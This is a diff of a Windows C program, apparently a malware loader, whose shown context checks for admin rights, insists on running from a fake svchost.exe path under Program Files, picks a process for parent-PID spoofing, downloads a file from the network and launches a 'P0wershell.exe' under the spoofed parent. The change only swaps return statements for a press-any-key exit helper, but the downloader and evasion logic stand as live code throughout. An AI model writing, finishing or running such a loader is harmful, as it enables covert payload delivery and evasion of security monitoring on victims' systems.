@@ -1,18 +1,26 @@
 #include <windows.h>
 #include <stdio.h>
+#include <conio.h>
 #include <tlhelp32.h>
 #include <urlmon.h>
 
 BOOL WINAPI IsUserAnAdmin(void);
 
+static void press_exit(int code) {
+    printf("\n[=] elevcheck exiting (%d). Press any key to close...\n", code);
+    Sleep(200);
+    _getch();
+    exit(code);
+}
+
 int main(void) {
     if (!IsUserAnAdmin())
-        return 1;
+        press_exit(1);
 
     char path[MAX_PATH];
     GetModuleFileNameA(NULL, path, MAX_PATH);
     if (lstrcmpiA(path, "C:\\Program Files\\Microsoft\\svchost.exe") != 0)
-        return 1;
+        press_exit(1);
 
     printf("[+] Running in Elevated Session.\n");
 
@@ -46,7 +54,7 @@ int main(void) {
 
     if (targetPID == 0) {
         printf("[-] No valid process found for PPID spoofing.\n");
-        return 1;
+        press_exit(1);
     }
     printf("[+] Using %s (PID: %lu) as spoofed parent\n", targetName, targetPID);
 
@@ -57,7 +65,7 @@ int main(void) {
     HRESULT hr = URLDownloadToFileA(NULL, url, outPath, 0, NULL);
     if (hr != S_OK) {
         printf("[-] Download failed (HRESULT: 0x%lx).\n", hr);
-        return 1;
+        press_exit(1);
     }
     printf("[+] Download complete.\n");
 
@@ -65,7 +73,7 @@ int main(void) {
     HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, targetPID);
     if (!hParent) {
         printf("[-] Failed to open target process (%lu)\n", GetLastError());
-        return 1;
+        press_exit(1);
     }
     printf("[+] Opened target process handle\n");
 
@@ -75,14 +83,14 @@ int main(void) {
     if (!attrList) {
         printf("[-] HeapAlloc failed\n");
         CloseHandle(hParent);
-        return 1;
+        press_exit(1);
     }
 
     if (!InitializeProcThreadAttributeList(attrList, 1, 0, &attrSize)) {
         printf("[-] InitializeProcThreadAttributeList failed (%lu)\n", GetLastError());
         HeapFree(GetProcessHeap(), 0, attrList);
         CloseHandle(hParent);
-        return 1;
+        press_exit(1);
     }
 
     if (!UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
@@ -90,7 +98,7 @@ int main(void) {
         DeleteProcThreadAttributeList(attrList);
         HeapFree(GetProcessHeap(), 0, attrList);
         CloseHandle(hParent);
-        return 1;
+        press_exit(1);
     }
     printf("[+] PPID attribute set\n");
 
@@ -101,7 +109,7 @@ int main(void) {
         DeleteProcThreadAttributeList(attrList);
         HeapFree(GetProcessHeap(), 0, attrList);
         CloseHandle(hParent);
-        return 1;
+        press_exit(1);
     }
     printf("[+] P0wershell.exe launched (PID: %lu) — waiting for completion\n", pi.dwProcessId);
     CloseHandle(pi.hThread);
@@ -112,5 +120,5 @@ int main(void) {
 
     WaitForSingleObject(pi.hProcess, INFINITE);
     CloseHandle(pi.hProcess);
-    return 0;
+    press_exit(0);
 }
